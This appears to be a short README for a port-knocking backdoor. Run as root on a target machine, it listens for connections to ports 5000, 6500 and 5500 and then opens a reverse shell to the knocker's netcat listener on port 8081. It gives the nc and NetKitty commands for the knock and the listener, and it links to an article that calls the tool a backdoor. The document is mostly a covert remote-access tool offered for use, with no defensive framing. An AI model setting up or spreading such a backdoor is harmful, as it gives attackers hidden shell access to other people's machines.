Port Knocking Activated Reverse Shell
---------------------------------
Simple Port Knocking implementation to activate a reverse shell on a remote machine

Usage
---------------
In the remote machine launch the application knock as root:

$ sudo ./knock eth0

It requires the interface to listen to packages

Then in the remote machine. 

1. Launch a server to receive the reverse shell connection. Default port is 8081

$ nc -l 8081

2. From another terminal/session send the connection packets to ports: 5000, 6500 and 5500

nc targetIP 5000; nc targetIP 6500 nc targetIP 5500

Or using NetKitty in one shot

$ nk -s T,8081 -c T,targetIP,5000 targetIP,6500 targetIP,5500


More Information
---------------------------
A detailed explanation can be found here:

SPANISH: http://www.papermint-designs.com/roor/2016-01-knock--knock--knocking-en-tu-backdoor
ENGLISH: _Comming Soon_


